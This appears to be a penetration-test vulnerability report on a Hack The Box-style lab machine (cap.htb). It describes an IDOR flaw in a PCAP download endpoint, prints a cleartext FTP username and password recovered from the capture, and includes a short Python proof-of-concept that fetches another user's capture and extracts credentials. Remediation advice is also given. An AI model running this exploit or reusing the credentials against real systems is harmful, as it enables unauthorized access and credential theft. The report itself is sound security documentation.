# IDOR in PCAP Download Endpoint Leads to Credential Disclosure

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-22 17:26:03 UTC
**Target:** http://cap.htb
**Endpoint:** /download/{id}
**Method:** GET
**CWE:** CWE-639
**CVSS:** 9.1

## Description

An Insecure Direct Object Reference (IDOR) vulnerability was identified in the Security Dashboard application's PCAP capture download feature. The application exposes sequential numeric IDs that allow unauthorized access to other users' captured network traffic.

The /capture endpoint creates network packet captures and redirects users to /data/{id} where the ID is sequentially assigned. By modifying the ID parameter to access /data/0 and /download/0, an attacker can download PCAP files belonging to other users without any authentication or authorization checks.

The PCAP file at ID 0 contained cleartext FTP credentials that were captured from network traffic, enabling complete system compromise.

## Impact

This vulnerability enables unauthorized access to sensitive network capture data belonging to other users. Specifically:

1. **Credential Theft**: PCAP files may contain cleartext authentication credentials (FTP, HTTP, IMAP, etc.)
2. **Data Exposure**: Captured traffic may reveal sensitive business data, API keys, session tokens
3. **Complete System Compromise**: In this case, FTP credentials were extracted allowing SSH access and eventual root privilege escalation

The attack requires no authentication and can be executed by any user who can access the web application.

## Technical Analysis

The vulnerability exists due to lack of authorization checks on the /data/{id} and /download/{id} endpoints:

1. The /capture endpoint creates PCAP files with sequential IDs starting from 0
2. No session validation or ownership verification is performed when accessing /data/{id}
3. The /download/{id} endpoint allows direct file download without verifying the requester owns the capture

Attack Flow:
1. Access /capture endpoint - creates new capture with ID 1
2. Modify ID to 0 to access previous captures
3. Download PCAP file via /download/0
4. Extract sensitive data from packet capture

The PCAP file contained FTP traffic with cleartext authentication:
```
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

## Proof of Concept

Steps to reproduce:

1. Access the web application at http://cap.htb
2. Navigate to the capture endpoint which redirects to /data/1
3. Modify the URL to access /data/0 (a capture that does not belong to current session)
4. Click Download or directly access /download/0
5. Analyze the downloaded PCAP file using network analysis tools
6. Extract credentials from captured FTP traffic

```
import requests
import subprocess
import os

TARGET = "http://cap.htb"

def exploit_idor():
    # Download the PCAP file at ID 0 (belongs to another user)
    download_url = f"{TARGET}/download/0"
    response = requests.get(download_url)
    
    if response.status_code == 200:
        pcap_file = "/tmp/capture_0.pcap"
        with open(pcap_file, 'wb') as f:
            f.write(response.content)
        
        print(f"[+] Downloaded PCAP file: {len(response.content)} bytes")
        
        # Extract strings and search for credentials
        result = subprocess.run(['strings', pcap_file], capture_output=True, text=True)
        
        print("[+] Extracted credentials from PCAP:")
        for line in result.stdout.split('\n'):
            if 'USER' in line or 'PASS' in line:
                print(f"    {line}")
        
        return True
    return False

if __name__ == "__main__":
    if exploit_idor():
        print("\n[+] IDOR exploitation successful - credentials obtained")
    else:
        print("[-] Exploitation failed")
```

## Remediation

1. Implement proper session-based authorization checks on /data/{id} and /download/{id} endpoints
2. Associate each capture with the user session that created it
3. Verify ownership before allowing access to any capture file
4. Consider implementing rate limiting on the /capture endpoint
5. Encrypt sensitive data in transit (use SFTP/FTPS instead of FTP)
6. Consider implementing authentication for the entire application
